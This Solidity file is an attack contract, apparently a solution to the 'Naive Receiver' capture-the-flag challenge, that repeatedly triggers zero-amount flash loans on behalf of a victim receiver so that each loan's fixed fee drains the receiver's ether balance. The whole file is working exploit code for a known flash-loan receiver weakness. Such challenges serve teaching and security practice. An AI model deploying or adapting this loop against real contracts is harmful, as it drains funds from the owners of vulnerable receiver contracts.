// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";

/**
 * @title NaiveReceiverAttacker
 * @author Elena (Ellena.xyz@proton.me)
 */
interface INaiveReceiverLenderPool {
    function fixedFee() external pure returns (uint256);

    function flashLoan(address payable borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttacker {
    using SafeMath for uint256;
    using Address for address payable;
    event Attack ( uint balance, uint fee );

    function attack(
        INaiveReceiverLenderPool pool,
        address payable receiver
    ) public {
        uint256 FIXED_FEE = pool.fixedFee();
        while (receiver.balance >= FIXED_FEE) {
            pool.flashLoan(receiver, 0);
            emit Attack ( receiver.balance/ 1e18, FIXED_FEE/ 1e18 );
        }
    }
}
